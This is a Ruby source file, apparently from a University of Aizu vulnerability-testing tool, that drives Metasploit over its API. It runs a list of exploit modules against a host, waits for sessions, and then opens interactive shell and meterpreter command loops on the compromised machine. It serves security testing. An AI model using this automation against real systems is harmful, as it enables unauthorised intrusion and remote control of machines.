# Copyright [2020] [University of Aizu]
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

require './lib/api/metasploit'
require './modules/ui'

module Attack
  class Metasploit
    attr_reader :host, :msf_api, :error, :exploits, :session_list

    ATTACK_TIME_LIMIT = 30

    def initialize(args)
      @host = args[:host]
      prepare_metasploit_api

      @exploits = args[:exploits]
      @session_list = {}

      @error = { flag: false, module_name: nil, module_option: [] }
    end

    def execute
      exploits.each do |exploit|
        exploit_option = exploit['options'].map { |option| { option['name'] => option['var'] } }.inject(:merge)
        exploit_option['LHOST'] = host

        execute_exploit(exploit['module_type'], exploit['module_name'], exploit_option)

        break if error[:flag]
      end

      error[:flag] ? VultestUI.warring('Can look at a report about error in attack execution') : execute_payload
    end

    private

    def prepare_metasploit_api
      @msf_api ||= API::Metasploit.new(host)
      msf_api.auth_login
      msf_api.console_create
    end

    def execute_exploit(exploit_type, exploit_name, exploit_option)
      exploit_info = msf_api.module_execute(type: exploit_type, name: exploit_name, option: exploit_option)

      return if success_exploit?(exploit_name, exploit_info)

      @error = {
        flag: true,
        module_name: exploit_name,
        module_option: exploit_option
      }
    end

    def success_exploit?(exploit_name, exploit_info)
      VultestUI.tty_spinner_begin(exploit_name)
      time_count = 0

      loop do
        time_count += sleep(1)

        if (time_count % ATTACK_TIME_LIMIT).zero?
          VultestUI.tty_spinner_end('error')
          return false unless TTY::Prompt.new.yes?('There\'s a possibility that attack is fail. Are you still going to continue that?')

          VultestUI.tty_spinner_begin(exploit_name)
        end

        session = msf_api.module_session_list.select do |_key, value|
          # When module is auxiliary/scanner/ssh/ssh_login, exploit_info['uuid'] != value['exploit_uuid']
          exploit_info['uuid'] == value['exploit_uuid'] || (exploit_name == 'auxiliary/scanner/ssh/ssh_login' && exploit_name == value['via_exploit'])
        end

        next if session.empty?

        VultestUI.tty_spinner_end('success')
        return !@session_list.merge!(session).empty?
      end
    end

    def execute_payload
      VultestUI.execute('Brake into target machine')

      session_list.each do |id, value|
        next if value['via_payload'].empty?

        case value['type']
        when 'meterpreter' then meterpreter_payload(id: id)
        when 'shell' then shell_payload(id: id)
        else next
        end
      end
    end

    def shell_payload(args)
      loop do
        cmd = gets.chomp
        break if cmd.split(' ')[0] == 'exit'

        msf_api.shell_write(id: args[:id], cmd: cmd)
        loop do
          res = msf_api.shell_read(args[:id])
          break if res['data'].empty?

          print res['data']
        end
      end
      msf_api.session_stop(args[:id])
    end

    def meterpreter_payload(args)
      loop do
        print 'meterpreter > '
        cmd = gets.chomp
        next if cmd.empty?
        break if cmd.split(' ')[0] == 'exit'

        msf_api.meterpreter_write(id: args[:id], cmd: cmd)
        next if cmd.split(' ')[0] =~ /cd/i || cmd.split(' ')[0] =~ /lcd/i

        loop do
          sleep(1)
          res = msf_api.meterpreter_read(args[:id])
          break if res['data'].empty?

          puts res['data']
        end
      end
      msf_api.session_stop(args[:id])
    end
  end
end
